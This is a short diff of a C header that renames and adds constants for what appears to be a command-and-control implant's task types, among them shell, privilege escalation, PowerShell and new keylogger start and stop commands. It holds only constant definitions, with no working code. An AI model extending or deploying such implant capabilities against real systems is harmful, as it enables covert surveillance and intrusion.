@@ -16,22 +16,25 @@
 #define RUN_AS 5
 #define RUN_U 6
 #define KILL_PROCESS 7
-#define DOWNLOAD 8
+#define DOWNLOAD_CHUNK 8
 #define CANCEL_DOWNLOAD 9
 
 // Task Types
 #define NOP 0
 #define INTIAL_CHECKIN 1
 #define KILL 2
+#define POWERSHELL 3
 #define SET 4
 #define PROCESS 5
-#define DOWNLOAD_2 6
+#define DOWNLOAD 6
 #define UPLOAD 7
 #define SHELL 8
 #define ESCALATE 9
 #define NET_ASM 10
 #define OBJECT_FILE 11
 #define GET_UID 12
+#define KEYLOGGER_START 13
+#define KEYLOGGER_STOP 14
 
 //  Statuses
 #define NO_FLAG 0
